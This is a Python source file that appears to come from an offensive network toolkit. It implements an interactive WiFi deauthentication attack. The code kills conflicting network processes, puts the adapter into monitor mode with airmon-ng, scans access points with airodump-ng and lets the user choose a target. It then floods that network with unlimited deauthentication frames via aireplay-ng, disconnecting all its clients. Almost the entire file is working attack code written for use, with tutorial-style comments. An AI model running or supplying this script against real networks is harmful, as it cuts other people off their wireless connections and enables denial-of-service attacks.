from scapy.all import  ARP, Ether, srp,  IP, UDP, BOOTP, DHCP, sendp, RandMAC, conf, send, ICMP, fragment, TCP
import re
from socket import *
import pyfiglet
import threading
from time import sleep
from pynput.keyboard import Key
import subprocess, re, csv, os, time, shutil
from datetime import datetime
from random import randint
from .HostScanner import *
from .PortScanner import *

# DEAUTHENTICATION ATTACK
def deauth():

    # We declare an empty list where all active wireless networks will be saved to.
    active_wireless_networks = []

    # We use this function to test if the ESSID is already in the list file. 
    # If so we return False so we don't add it again.
    # If it is not in the lst we return True which will instruct the elif 
    # statement to add it to the lst.
    def check_for_essid(essid, lst):
        check_status = True

        # If no ESSIDs in list add the row
        if len(lst) == 0:
            return check_status

        # This will only run if there are wireless access points in the list.
        for item in lst:
            # If True don't add to list. False will add it to list
            if essid in item["ESSID"]:
                check_status = False

        return check_status


    # If the user doesn't run the program with super user privileges, don't allow them to continue.
    if not 'SUDO_UID' in os.environ.keys():
        print("Try running this program with sudo.")
        exit()

    # Move all .csv files in the directory to a backup folder.
    for file_name in os.listdir():
        # We should only have one csv file as we delete them from the folder every time we run the program.
        if ".csv" in file_name:
            print("There shouldn't be any .csv files in your directory. We found .csv files in your directory.")
            # We get the current working directory.
            directory = os.getcwd()
            try:
                # We make a new directory called /backup
                os.mkdir(directory + "/backup/")
            except:
                print("Backup folder exists.")
            # Create a timestamp
            timestamp = datetime.now()
            # We copy any .csv files in the folder to the backup folder.
            shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)

    # Regex to find wireless interfaces, we're making the assumption they will all be wlan0 or higher.
    wlan_pattern = re.compile("^wlan[0-9]+")

        # Python allows us to run system commands by using a function provided by the subprocess module. 
    # subprocess.run(<list of command line arguments goes here>, <specify if you want the capture_output to be True>)
    # We want to capture the output. The output will be in standard UTF-8 and will decode it.
    # The script is the parent process and creates a child process which runs the system command, and will only continue once the child process has completed.
    # We run the iwconfig command to look for wireless interfaces.
    check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

    # No WiFi Adapter connected.
    if len(check_wifi_result) == 0:
        print("Please connect a WiFi controller and try again.")
        exit()

    # Menu to select WiFi interface from
    print("The following WiFi interfaces are available:")
    for index, item in enumerate(check_wifi_result):
        print(f"{index} - {item}")

    # Ensure the WiFi interface selected is valid. Simple menu with interfaces to select from.
    while True:
        wifi_interface_choice = input("Please select the interface you want to use for the attack: ")
        try:
            if check_wifi_result[int(wifi_interface_choice)]:
                break
        except:
            print("Please enter a number that corresponds with the choices.")

    # For easy reference we call the picked interface hacknic
    hacknic = check_wifi_result[int(wifi_interface_choice)]

    # Kill conflicting WiFi processses
    print("WiFi adapter connected!\nNow let's kill conflicting processes:")

    # subprocess.run(<list of command line arguments goes here>)
    # The script is the parent process and creates a child process which runs the system command, and will only continue once the child process has completed.
    # We run the iwconfig command to look for wireless interfaces.
    # Killing all conflicting processes using airmon-ng
    kill_confilict_processes =  subprocess.run(["sudo", "airmon-ng", "check", "kill"])

    # Put wireless in Monitored mode
    print("Putting Wifi adapter into monitored mode:")
    put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", hacknic])

    # subprocess.Popen(<list of command line arguments goes here>)
    # The Popen method opens a pipe from a command. The output is an open file that can be accessed by other programs.
    # We run the iwconfig command to look for wireless interfaces.
    # Discover access points
    discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", hacknic], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Loop that shows the wireless access points. We use a try except block and we will quit the loop by pressing ctrl-c.
    try:
        while True:
            # We want to clear the screen before we print the network interfaces.
            subprocess.call("clear", shell=True)
            for file_name in os.listdir():
                # We should only have one csv file as we backup all previous csv files from the folder every time we run the program. 
                # The following list contains the field names for the csv entries.
                fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                if ".csv" in file_name:
                    with open(file_name) as csv_h:
                        # We use the DictReader method and tell it to take the csv_h contents and then apply the dictionary with the fieldnames we specified above. 
                        # This creates a list of dictionaries with the keys as specified in the fieldnames.
                        csv_h.seek(0)
                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for row in csv_reader:
                            if row["BSSID"] == "BSSID":
                                pass
                            elif row["BSSID"] == "Station MAC":
                                break
                            elif check_for_essid(row["ESSID"], active_wireless_networks):
                                active_wireless_networks.append(row)

            print("Scanning. Press Ctrl+C when you want to select which wireless network you want to attack.\n")
            print("No |\tBSSID              |\tChannel|\tESSID                         |")
            print("___|\t___________________|\t_______|\t______________________________|")
            for index, item in enumerate(active_wireless_networks):
                # We're using the print statement with an f-string. 
                # F-strings are a more intuitive way to include variables when printing strings, 
                # rather than ugly concatenations.
                print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
            # We make the script sleep for 1 second before loading the updated list.
            time.sleep(1)

    except KeyboardInterrupt:
        print("\nReady to make choice.")

    # Ensure that the input choice is valid.
    while True:
        choice = input("Please select a choice from above: ")
        try:
            if active_wireless_networks[int(choice)]:
                break
        except:
            print("Please try again.")

    # To make it easier to work with we assign the results to variables.
    hackbssid = active_wireless_networks[int(choice)]["BSSID"]
    hackchannel = active_wireless_networks[int(choice)]["channel"].strip()

    # Change to the channel we want to perform the DOS attack on. 
    # Monitoring takes place on a different channel and we need to set it to that channel. 
    subprocess.run(["airmon-ng", "start", hacknic, hackchannel])

    # Deauthenticate clients. We run it with Popen and we send the output to subprocess.DEVNULL and the errors to subprocess.DEVNULL. We will thus run deauthenticate in the background.
    subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)]], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) 

    # We run an infinite loop which you can quit by presses ctrl-c. The deauthentication will stop when we stop the script.
    try:
        while True:
            print("Deauthenticating clients, press ctrl-c to stop")
    except KeyboardInterrupt:
        print("Stop monitoring mode")
        # We run a subprocess.run command where we stop monitoring mode on the network adapter.
        subprocess.run(["airmon-ng", "stop", hacknic])
        subprocess.run(["systemctl", "start", "NetworkManager"])
        print("Thank you! Exiting now")